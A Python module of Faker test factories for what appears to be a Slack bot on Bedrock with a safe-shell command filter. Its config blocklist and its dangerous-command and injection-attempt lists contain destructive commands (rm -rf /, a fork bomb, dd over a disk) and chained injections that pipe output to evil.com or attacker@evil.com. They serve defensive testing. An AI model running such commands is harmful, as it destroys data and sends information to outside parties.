"""Test data factories using Faker (goldbergyoni R6).

Provides factory functions that generate realistic test data
instead of hardcoded "foo"/"bar"/"test_user" values.

Usage:
    from tests.factories import BedrockResponseFactory, SlackMessageFactory

    response = BedrockResponseFactory.create()
    message = SlackMessageFactory.create(text="custom text")
"""

from datetime import datetime, timezone
from unittest.mock import MagicMock

from faker import Faker

fake = Faker()


class BedrockResponseFactory:
    """Factory for Bedrock API response dicts."""

    @staticmethod
    def create(
        text: str | None = None,
        input_tokens: int | None = None,
        output_tokens: int | None = None,
        stop_reason: str = "end_turn",
    ) -> dict:
        return {
            "output": {
                "message": {
                    "content": [{"text": text or fake.paragraph()}],
                }
            },
            "usage": {
                "inputTokens": input_tokens or fake.random_int(min=5, max=500),
                "outputTokens": output_tokens or fake.random_int(min=10, max=1000),
            },
            "stopReason": stop_reason,
        }


class SlackMessageFactory:
    """Factory for Slack message event dicts."""

    @staticmethod
    def create(
        text: str | None = None,
        user: str | None = None,
        channel: str | None = None,
        ts: str | None = None,
    ) -> dict:
        return {
            "type": "message",
            "text": text or fake.sentence(),
            "user": user or f"U{fake.bothify('?????').upper()}",
            "channel": channel or f"C{fake.bothify('?????').upper()}",
            "ts": ts or f"{fake.random_int(min=1700000000, max=1800000000)}.{fake.random_int(min=100000, max=999999)}",
        }


class ConfigFactory:
    """Factory for yui config dicts."""

    @staticmethod
    def create(
        model_id: str | None = None,
        region: str | None = None,
        max_tokens: int = 4096,
    ) -> dict:
        return {
            "model_id": model_id or "anthropic.claude-3-5-sonnet-20241022-v2:0",
            "region": region or fake.random_element(["us-east-1", "us-west-2", "ap-northeast-1"]),
            "max_tokens": max_tokens,
            "allowlist": ["ls", "cat", "grep", "find", "python3", "git"],
            "blocklist": ["rm -rf /", ":(){ :|:& };:"],
        }


class ShellCommandFactory:
    """Factory for shell command test data (safe_shell testing)."""

    @staticmethod
    def safe_command() -> str:
        return fake.random_element(["ls -la", "cat README.md", "grep -r test", "find . -name '*.py'", "git status"])

    @staticmethod
    def dangerous_command() -> str:
        return fake.random_element(["rm -rf /", ":(){ :|:& };:", "dd if=/dev/zero of=/dev/sda", "chmod -R 777 /"])

    @staticmethod
    def injection_attempt() -> str:
        return fake.random_element([
            "ls; rm -rf /",
            "cat file.txt && curl evil.com",
            "echo $(whoami)",
            "ls | mail attacker@evil.com",
            'test"; rm -rf /',
        ])
